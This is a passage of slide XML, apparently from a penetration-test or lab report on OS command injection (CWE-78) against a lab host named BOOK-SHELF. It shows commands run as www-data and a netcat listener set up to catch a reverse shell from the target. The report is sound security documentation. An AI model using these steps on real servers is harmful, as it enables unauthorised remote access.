          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2057400"/>
            <a:ext cx="6263640" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="2057400"/>
            <a:ext cx="5897880" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="22C55E"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>uid=33(www-data) gid=33(www-data) groups=33(www-data)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2788920"/>
            <a:ext cx="6263640" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>whoami  →  www-data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>hostname  →  debian</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>uname -a  →  Linux debian 4.19.0-14-amd64 ...</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="493776" y="3694176"/>
            <a:ext cx="6373368" cy="2075688"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Image 0" descr="/home/claude/report_imgs/fig4_command_injection.jpg">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3749040"/>
            <a:ext cx="6263640" cy="1965960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5788152"/>
            <a:ext cx="6263640" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Figure 3 — id executes on the server; www-data identity returned</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="1371600"/>
            <a:ext cx="4572000" cy="2880360"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2540"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="1508760"/>
            <a:ext cx="4114800" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="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WHAT IS OS COMMAND INJECTION?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="1965960"/>
            <a:ext cx="4114800" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>User Input</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="2258568"/>
            <a:ext cx="4114800" cy="182880"/>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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="2423160"/>
            <a:ext cx="4114800" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Application Parameter</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="2715768"/>
            <a:ext cx="4114800" cy="182880"/>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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="2880360"/>
            <a:ext cx="4114800" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Unsafe OS Command Execution</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 18"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="3172968"/>
            <a:ext cx="4114800" cy="182880"/>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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="3337560"/>
            <a:ext cx="4114800" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Operating System</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="3630168"/>
            <a:ext cx="4114800" cy="182880"/>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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="3794760"/>
            <a:ext cx="4114800" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Attacker-Controlled Command</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7040880" y="4434840"/>
            <a:ext cx="4572000" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5161"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="4572000"/>
            <a:ext cx="4114800" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CWE-78  ·  WHY CRITICAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="4864608"/>
            <a:ext cx="4114800" cy="914400"/>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No authentication was required — any unauthenticated attacker on the network can execute arbitrary commands with a single crafted request. This is the highest-severity class of web vulnerability.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12</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05 · EXPLOITATION</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From RCE to Reverse Shell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5120640" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="38BDF8"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1554480"/>
            <a:ext cx="5120640" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ATTACKER (KALI)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1874520"/>
            <a:ext cx="51206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192.168.76.128 : 4444</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2331720"/>
            <a:ext cx="5120640" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>nc -lvnp 4444  (listener)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="16200000">
            <a:off x="5623560" y="2084832"/>
            <a:ext cx="1005840" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="950" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>reverse connection →</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="950" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="1417320"/>
            <a:ext cx="5120640" cy="1554480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4706"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="EF4444"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="1554480"/>
            <a:ext cx="5120640" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>TARGET (BOOK-SHELF)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="1874520"/>
            <a:ext cx="51206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192.168.76.157</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2331720"/>
            <a:ext cx="5120640" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>running as www-data</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="3200400"/>
            <a:ext cx="5120640" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="3291840"/>
            <a:ext cx="4791456" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ nc -lvnp 4444</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
